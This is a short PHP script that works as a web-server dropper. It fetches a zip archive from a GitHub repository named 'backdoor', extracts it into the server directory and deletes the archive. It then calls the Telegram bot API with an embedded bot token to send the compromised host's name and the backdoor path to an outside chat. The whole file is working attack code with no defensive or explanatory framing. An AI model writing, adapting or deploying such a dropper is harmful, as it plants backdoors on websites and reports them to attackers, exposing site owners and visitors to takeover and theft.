<?php
        define('filename', 'fuck.zip');

        $url = "https://github.com/trinhngocminh/backdoor/blob/main/fuck.zip?raw=true"; 
        file_put_contents(filename, file_get_contents($url));

        $file = filename;
        $path = pathinfo(realpath($file), PATHINFO_DIRNAME);
        $zip = new ZipArchive;
        $res = $zip->open($file);
        if ($res === TRUE)
        {
            $zip->extractTo($path);
            $zip->close();

            unlink(filename);
            $telegram = file_get_contents('https://api.telegram.org/bot5261973073:AAHSp42HYUo7UU73knB_jFsgLsb5kYqhkz8/sendMessage?chat_id=1996812631&text='.$_SERVER['HTTP_HOST'].'/file/backdooor/');
            
        }else{
            echo('Lỗi');
            die();
        }
?>